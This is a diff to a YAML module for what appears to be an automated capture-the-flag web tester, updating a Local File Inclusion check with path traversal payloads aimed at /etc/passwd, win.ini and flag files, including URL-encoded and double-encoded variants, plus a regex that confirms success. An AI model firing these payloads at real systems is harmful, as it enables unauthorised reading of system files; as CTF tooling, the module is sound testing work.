@@ -1,10 +1,16 @@
 id: web_lfi
 name: Local File Inclusion
 category: web
-version: "1.0"
+version: "1.1"
 author: system
 description: >
   Detects and exploits LFI via path traversal techniques.
+
+tags:
+  - lfi
+  - file-inclusion
+  - traversal
+estimated_duration_seconds: 20
 
 applies_when:
   - "context.challenge.type == 'web'"
@@ -26,13 +32,18 @@ detection:
         - id: dot_dot_probe
           action: http_probe
           with:
-            payloads: ["../../../../../../etc/passwd", '..\..\..\..\..\..\..\windows\win.ini']
+            payloads:
+              - "../../../../../../etc/passwd"
+              - "..\\..\\..\\..\\..\\..\\windows\\win.ini"
+              - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+              - "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
             inject_into: all_params
             mutation_families: [param_remove, value_empty]
             target_selector: all_inputs
             max_variants: 10
           signals:
-            - match: 'root:x:0:0:|\[extensions\]'
+            - match:
+                condition: "response.status in [200, 206, 500] and re.search(r'root:x:0:0:|\\[extensions\\]|\\[fonts\\]|localhost', response.body, re.I)"
               on_match:
                 confidence_boost: 0.90
                 emit: lfi_confirmed
@@ -48,5 +59,9 @@ exploitation:
         - id: extract_flag
           action: http_probe
           with:
-            payloads: ["../../../../../../flag.txt", "flag.txt", "/flag.txt"]
+            payloads:
+              - "../../../../../../flag.txt"
+              - "flag.txt"
+              - "/flag.txt"
+              - "../../../../../../app/flag.txt"
             inject_into: vulnerable_param
